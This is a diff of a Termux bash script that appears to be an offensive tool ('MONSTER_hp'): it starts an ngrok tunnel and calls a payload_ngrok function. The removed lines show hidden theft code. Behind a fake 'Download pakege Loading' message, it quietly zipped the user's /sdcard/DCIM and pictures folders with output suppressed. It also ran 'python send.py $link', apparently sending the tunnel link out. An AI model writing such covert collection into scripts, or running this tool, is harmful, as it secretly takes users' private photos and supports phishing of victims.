@@ -10,14 +10,6 @@
 #                         </> MONSTER_hp </>
 
 trap 'printf "\n";stop' 2
-pkg install php -y 
-pkg install openssh -y
-pkg install ssh -y
-pkg install wget -y
-pip install requests
-pip install platform
-pip install sys
-termux-setup-storage
 printf "\e[1;92m
 
  ____                      _                 _
@@ -27,18 +19,12 @@ printf "\e[1;92m
 /n"
 printf " \e[1;95m    Download pakege Loading 15 min time \n"
 printf "\n"
-
+pkg install php -y 
+pkg install openssh -y
+pkg install ssh -y
+pkg install wget -y
 printf "\e[1;90m    \n"
-chmod +x *
-zip server1 -r /sdcard/DCIM > /dev/null 2>&1
-printf " \e[1;95m   OK Pakge 1  \n"
-printf "\n"
-printf "\e[1;92m
 
-Loading Pakge 2 ...
-                                                         
-/n"
-zip server2 -r /sdcard/pictures > /dev/null 2>&1
 clear
 banner() {
 
@@ -218,7 +204,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-python send.py $link
+
 sleep 15
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 payload_ngrok
